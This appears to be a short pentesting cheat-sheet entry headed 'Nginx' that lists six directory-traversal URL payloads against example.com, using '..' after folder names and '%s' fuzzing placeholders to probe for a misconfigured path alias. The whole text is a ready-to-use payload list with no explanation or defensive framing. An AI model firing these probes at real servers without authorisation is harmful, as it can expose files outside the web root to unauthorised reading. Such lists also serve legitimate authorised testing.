# Nginx

1. Directory traversal
```
https://example.com/folder1../folder1/folder2/static/main.css
https://example.com/folder1../%s/folder2/static/main.css
https://example.com/folder1/folder2../folder2/static/main.css
https://example.com/folder1/folder2../%s/static/main.css
https://example.com/folder1/folder2/static../static/main.css
https://example.com/folder1/folder2/static../%s/main.css
```